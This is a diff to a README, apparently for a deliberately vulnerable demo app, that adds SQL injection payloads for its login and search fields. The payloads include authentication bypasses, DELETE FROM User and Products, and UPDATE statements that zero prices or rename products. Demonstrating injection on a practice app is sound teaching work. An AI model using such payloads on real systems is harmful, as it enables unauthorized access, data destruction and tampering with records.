@@ -59,9 +59,18 @@ After there is a user in the database, you can attempt to sign in with their cre
 
 ## Hacking the Database
 
+### Login Example
 The SQL injection can be done using the password field of the form. Try some of the following commands:
 - ``` ' OR email = 'you_email_here' --```
 - ``` '; DELETE FROM User -- ```
 - ```' OR 1 = 1 LIMIT 1 -- ```
+
+### Amazon Example
+The SQL injection can be done using the search field of the view. **_Note that the bell icon will add the initial values to the database_** Try some of the following commands:
+- ```%'; UPDATE Products set price = 0 where name = 'Yeezys' -- ```
+- ```%'; UPDATE Products set rating = 0 where name = 'Yeezys' -- ```
+- ```%'; UPDATE Products set price = 2 where name like '%ray-ban%' -- ```
+- ```%'; UPDATE Products set name = 'hak3d' where name like '%r2-d2%' -- ```
+- ```%'; DELETE FROM Products -- ```
 
 Have Fun!!!
